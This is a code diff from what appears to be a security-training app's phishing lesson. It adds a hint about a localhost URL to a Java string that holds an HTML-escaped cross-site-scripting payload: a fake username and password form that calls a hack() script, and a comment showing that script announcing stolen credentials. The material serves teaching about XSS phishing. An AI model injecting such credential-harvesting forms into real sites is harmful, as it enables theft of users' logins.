@@ -223,7 +223,8 @@ public class Phishing extends LessonAdapter
 					 + "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
 					 + "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
 					 + "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
-					 + "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
+					 + "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;"
+					 + "<BR><BR>You may need to remove the '.' from the http://localhost./");
 		/**
 		 * password<script>function hack(){ alert("Had this been a real
 		 * attack... Your credentials were just stolen.\nUser Name = " +
